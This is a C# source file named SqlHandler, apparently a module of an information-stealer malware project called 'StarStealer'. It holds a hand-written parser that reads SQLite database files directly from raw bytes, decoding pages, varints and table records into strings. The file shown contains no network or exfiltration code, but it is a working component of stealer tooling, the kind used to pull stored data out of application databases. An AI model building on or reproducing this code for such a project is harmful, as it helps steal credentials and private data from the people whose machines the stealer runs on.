﻿using System;
using System.IO;
using System.Text;

namespace StarStealer.APIs
{
    internal class SqlHandler
    {
        private readonly byte[] _sqlDataTypeSize = new byte[10] {0,1,2,3,4,6,8,8,0,0};
        private readonly ulong _dbEncoding;
        private readonly byte[] _fileBytes;
        private readonly ulong _pageSize;
        private string[] _fieldNames;
        private SqliteMasterEntry[] _masterTableEntries;
        private TableEntry[] _tableEntries;
        public SqlHandler(string fileName)
        {
            _fileBytes = File.ReadAllBytes(fileName);
            _pageSize = ConvertToULong(16, 2);
            _dbEncoding = ConvertToULong(56, 4);
            ReadMasterTable(100L);
        }

        public string GetValue(int field, int rowNum)
        {
            try
            {
                if (rowNum >= _tableEntries.Length)
                    return null;
                return field >= _tableEntries[rowNum].Content.Length ? null : _tableEntries[rowNum].Content[field];
            }
            catch
            {
                return null;
            }
        }

        public int GetRowCount() => _tableEntries.Length;

        private bool ReadTableFromOffset(ulong offset)
        {
            try
            {
                if (_fileBytes[offset] == 13)
                {
                    int num2 = 0;
                    if (_tableEntries != null)
                    {
                        num2 = _tableEntries.Length;
                        Array.Resize(ref _tableEntries, _tableEntries.Length + (ushort)(ConvertToULong((int)offset + 3, 2) - 1UL) + 1);
                    }
                    else
                        _tableEntries = new TableEntry[((ushort)(ConvertToULong((int)offset + 3, 2) - 1UL) + 1)];
                    for (ushort index1 = 0; index1 <= (ushort)(ConvertToULong((int)offset + 3, 2) - 1UL); ++index1)
                    {
                        ulong num3 = ConvertToULong((int)offset + 8 + index1 * 2, 2);
                        if ((long)offset != 100L)
                        {
                            num3 += offset;
                        }
                        int endIdx1 = Gvl((int)num3);
                        Cvl((int)num3, endIdx1);
                        int endIdx2 = Gvl((int)((long)num3 + (endIdx1 - (long)num3) + 1L));
                        Cvl((int)((long)num3 + (endIdx1 - (long)num3) + 1L), endIdx2);
                        ulong num4 = num3 + (ulong)(endIdx2 - (long)num3 + 1L);
                        RecordHeaderField[] array = null;
                        int index2 = 0;
                        while ((long)num4 - Gvl((int)num4) + 1L < Cvl((int)num4, Gvl((int)num4)))
                        {
                            Array.Resize(ref array, index2 + 1);
                            int endIdx4 = Gvl((int)num4);
                            int startIdx = endIdx4 + 1;
                            endIdx4 = Gvl(startIdx);
                            array[index2].Type = Cvl(startIdx, endIdx4);
                            array[index2].Size = array[index2].Type <= 9L ? _sqlDataTypeSize[array[index2].Type] : (!IsOdd(array[index2].Type) ? (array[index2].Type - 12L) / 2L : (array[index2].Type - 13L) / 2L);
                            long num6 = (long)num4 - Gvl((int)num4) + 1L;
                            num6 = (long)num4 - Gvl((int)num4) + 1L + (endIdx4 - startIdx) + 1L;
                            ++index2;
                        }
                        if (array != null)
                        {
                            _tableEntries[num2 + index1].Content = new string[array.Length];
                            int num7 = 0;
                            for (int index3 = 0; index3 <= array.Length - 1; ++index3)
                            {
                                if (array[index3].Type > 9L)
                                {
                                    if (!IsOdd(array[index3].Type))
                                    {
                                        if ((long)_dbEncoding == 1L)
                                            _tableEntries[num2 + index1].Content[index3] = Encoding.Default.GetString(_fileBytes, (int)((long)num4 + Cvl((int)num4, Gvl((int)num4)) + num7), (int)array[index3].Size);
                                        else if ((long)_dbEncoding == 2L)
                                            _tableEntries[num2 + index1].Content[index3] = Encoding.Unicode.GetString(_fileBytes, (int)((long)num4 + Cvl((int)num4, Gvl((int)num4)) + num7), (int)array[index3].Size);
                                        else if ((long)_dbEncoding == 3L)
                                            _tableEntries[num2 + index1].Content[index3] = Encoding.BigEndianUnicode.GetString(_fileBytes, (int)((long)num4 + Cvl((int)num4, Gvl((int)num4)) + num7), (int)array[index3].Size);
                                    }
                                    else
                                        _tableEntries[num2 + index1].Content[index3] = Encoding.Default.GetString(_fileBytes, (int)((long)num4 + Cvl((int)num4, Gvl((int)num4)) + num7), (int)array[index3].Size);
                                }
                                else
                                    _tableEntries[num2 + index1].Content[index3] = Convert.ToString(ConvertToULong((int)((long)num4 + Cvl((int)num4, Gvl((int)num4)) + num7), (int)array[index3].Size));
                                num7 += (int)array[index3].Size;
                            }
                        }
                    }
                }
                else if (_fileBytes[offset] == 5)
                {
                    for (ushort index = 0; index <= (ushort)(ConvertToULong((int)((long)offset + 3L), 2) - 1UL); ++index)
                    {
                        ushort num2 = (ushort)ConvertToULong((int)offset + 12 + index * 2, 2);
                        ReadTableFromOffset((ConvertToULong((int)((long)offset + num2), 4) - 1UL) * _pageSize);
                    }
                    ReadTableFromOffset((ConvertToULong((int)((long)offset + 8L), 4) - 1UL) * _pageSize);
                }
                return true;
            }
            catch
            {
                return false;
            }
        }

        private void ReadMasterTable(long offset)
        {
            try
            {
                switch (_fileBytes[offset])
                {
                    case 5:
                        for (int index = 0; index <= (ushort)(ConvertToULong((int)offset + 3, 2) - 1UL); ++index)
                        {
                            if (offset == 100L)
                                ReadMasterTable(((long)ConvertToULong((ushort)ConvertToULong((int)offset + 12 + index * 2, 2), 4) - 1L) * (long)_pageSize);
                            else
                                ReadMasterTable(((long)ConvertToULong((int)(offset + (ushort)ConvertToULong((int)offset + 12 + index * 2, 2)), 4) - 1L) * (long)_pageSize);
                        }
                        ReadMasterTable(((long)ConvertToULong((int)offset + 8, 4) - 1L) * (long)_pageSize);
                        break;
                    case 13:
                        ulong num3 = ConvertToULong((int)offset + 3, 2) - 1UL;
                        int num4 = 0;
                        if (_masterTableEntries != null)
                        {
                            num4 = _masterTableEntries.Length;
                            Array.Resize(ref _masterTableEntries, _masterTableEntries.Length + (int)num3 + 1);
                        }
                        else
                            _masterTableEntries = new SqliteMasterEntry[checked((ulong)unchecked((long)num3 + 1L))];
                        for (ulong index1 = 0; index1 <= num3; ++index1)
                        {
                            ulong num2 = ConvertToULong((int)offset + 8 + (int)index1 * 2, 2);
                            if (offset != 100L)
                                num2 += (ulong)offset;
                            Cvl(startIdx: (int)num2, endIdx: Gvl((int)num2));
                            int endIdx2 = Gvl((int)((long)num2 + (Gvl((int)num2) - (long)num2) + 1L));
                            Cvl((int)((long)num2 + (Gvl((int)num2) - (long)num2) + 1L), endIdx2);
                            int endIdx3 = Gvl((int)(num2 + (ulong)(endIdx2 - (long)num2 + 1L)));
                            int endIdx4 = endIdx3;
                            long[] numArray = new long[5];
                            for (int index2 = 0; index2 <= 4; ++index2)
                            {
                                int startIdx = endIdx4 + 1;
                                endIdx4 = Gvl(startIdx);
                                numArray[index2] = Cvl(startIdx, endIdx4);
                                numArray[index2] = numArray[index2] <= 9L ? _sqlDataTypeSize[numArray[index2]] : (!IsOdd(numArray[index2]) ? (numArray[index2] - 12L) / 2L : (numArray[index2] - 13L) / 2L);
                            }
                            if ((long)_dbEncoding == 1L)
                                _masterTableEntries[num4 + (int)index1].ItemName = Encoding.Default.GetString(_fileBytes, (int)((long)(num2 + (ulong)(endIdx2 - (long)num2 + 1L)) + Cvl((int)(num2 + (ulong)(endIdx2 - (long)num2 + 1L)), endIdx3) + numArray[0]), (int)numArray[1]);
                            else if ((long)_dbEncoding == 2L)
                                _masterTableEntries[num4 + (int)index1].ItemName = Encoding.Unicode.GetString(_fileBytes, (int)((long)(num2 + (ulong)(endIdx2 - (long)num2 + 1L)) + Cvl((int)(num2 + (ulong)(endIdx2 - (long)num2 + 1L)), endIdx3) + numArray[0]), (int)numArray[1]);
                            else if ((long)_dbEncoding == 3L)
                                _masterTableEntries[num4 + (int)index1].ItemName = Encoding.BigEndianUnicode.GetString(_fileBytes, (int)((long)(num2 + (ulong)(endIdx2 - (long)num2 + 1L)) + Cvl((int)(num2 + (ulong)(endIdx2 - (long)num2 + 1L)), endIdx3) + numArray[0]), (int)numArray[1]);
                            _masterTableEntries[num4 + (int)index1].RootNum = (long)ConvertToULong((int)((long)(num2 + (ulong)(endIdx2 - (long)num2 + 1L)) + Cvl((int)(num2 + (ulong)(endIdx2 - (long)num2 + 1L)), endIdx3) + numArray[0] + numArray[1] + numArray[2]), (int)numArray[3]);
                            if ((long)_dbEncoding == 1L)
                                _masterTableEntries[num4 + (int)index1].SqlStatement = Encoding.Default.GetString(_fileBytes, (int)((long)(num2 + (ulong)(endIdx2 - (long)num2 + 1L)) + Cvl((int)(num2 + (ulong)(endIdx2 - (long)num2 + 1L)), endIdx3) + numArray[0] + numArray[1] + numArray[2] + numArray[3]), (int)numArray[4]);
                            else if ((long)_dbEncoding == 2L)
                                _masterTableEntries[num4 + (int)index1].SqlStatement = Encoding.Unicode.GetString(_fileBytes, (int)((long)(num2 + (ulong)(endIdx2 - (long)num2 + 1L)) + Cvl((int)(num2 + (ulong)(endIdx2 - (long)num2 + 1L)), endIdx3) + numArray[0] + numArray[1] + numArray[2] + numArray[3]), (int)numArray[4]);
                            else if ((long)_dbEncoding == 3L)
                                _masterTableEntries[num4 + (int)index1].SqlStatement = Encoding.BigEndianUnicode.GetString(_fileBytes, (int)((long)(num2 + (ulong)(endIdx2 - (long)num2 + 1L)) + Cvl((int)(num2 + (ulong)(endIdx2 - (long)num2 + 1L)), endIdx3) + numArray[0] + numArray[1] + numArray[2] + numArray[3]), (int)numArray[4]);
                        }
                        break;
                }
            }
            catch
            {
            }
        }

        public bool ReadTable(string tableName)
        {
            try
            {
                int index1 = -1;
                for (int index2 = 0; index2 <= _masterTableEntries.Length; ++index2)
                {
                    if (string.Compare(_masterTableEntries[index2].ItemName.ToLower(), tableName.ToLower(), StringComparison.Ordinal) == 0)
                    {
                        index1 = index2;
                        break;
                    }
                }
                if (index1 == -1)
                    return false;
                string[] strArray = _masterTableEntries[index1].SqlStatement.Substring(_masterTableEntries[index1].SqlStatement.IndexOf("(", StringComparison.Ordinal) + 1).Split(',');
                for (int index2 = 0; index2 <= strArray.Length - 1; ++index2)
                {
                    strArray[index2] = strArray[index2].TrimStart();
                    int length = strArray[index2].IndexOf(' ');
                    if (length > 0)
                        strArray[index2] = strArray[index2].Substring(0, length);
                    if (strArray[index2].IndexOf("UNIQUE", StringComparison.Ordinal) != 0)
                    {
                        Array.Resize<string>(ref _fieldNames, index2 + 1);
                        _fieldNames[index2] = strArray[index2];
                    }
                }
                return ReadTableFromOffset((ulong)(_masterTableEntries[index1].RootNum - 1L) * _pageSize);
            }
            catch
            {
                return false;
            }
        }

        private ulong ConvertToULong(int startIndex, int size)
        {
            try
            {
                if (size > 8 | size == 0)
                    return 0;
                ulong num = 0;
                for (int index = 0; index <= size - 1; ++index)
                    num = num << 8 | _fileBytes[startIndex + index];
                return num;
            }
            catch
            {
                return 0;
            }
        }

        private int Gvl(int startIdx)
        {
            try
            {
                if (startIdx > _fileBytes.Length)
                    return 0;
                for (int index = startIdx; index <= startIdx + 8; ++index)
                {
                    if (index > _fileBytes.Length - 1)
                        return 0;
                    if ((_fileBytes[index] & 128) != 128)
                        return index;
                }
                return startIdx + 8;
            }
            catch
            {
                return 0;
            }
        }

        private long Cvl(int startIdx, int endIdx)
        {
            try
            {
                ++endIdx;
                byte[] numArray = new byte[8];
                int num1 = endIdx - startIdx;
                bool flag = false;
                if (num1 == 0 | num1 > 9)
                    return 0;
                if (num1 == 1)
                {
                    numArray[0] = (byte)(_fileBytes[startIdx] & (uint)sbyte.MaxValue);
                    return BitConverter.ToInt64(numArray, 0);
                }
                if (num1 == 9)
                    flag = true;
                int num2 = 1;
                int num3 = 7;
                int index1 = 0;
                if (flag)
                {
                    numArray[0] = _fileBytes[endIdx - 1];
                    --endIdx;
                    index1 = 1;
                }
                int index2 = endIdx - 1;
                while (index2 >= startIdx)
                {
                    if (index2 - 1 >= startIdx)
                    {
                        numArray[index1] = (byte)(_fileBytes[index2] >> num2 - 1 & byte.MaxValue >> num2 | _fileBytes[index2 - 1] << num3);
                        ++num2;
                        ++index1;
                        --num3;
                    }
                    else if (!flag)
                        numArray[index1] = (byte)(_fileBytes[index2] >> num2 - 1 & byte.MaxValue >> num2);
                    index2 += -1;
                }
                return BitConverter.ToInt64(numArray, 0);
            }
            catch
            {
                return 0;
            }
        }

        private static bool IsOdd(long value)
        {
            return (value & 1L) == 1L;
        }

        private struct RecordHeaderField
        {
            public long Size;
            public long Type;
        }

        private struct TableEntry
        {
            public string[] Content;
        }

        private struct SqliteMasterEntry
        {
            public string ItemName;
            public long RootNum;
            public string SqlStatement;
        }
    }
}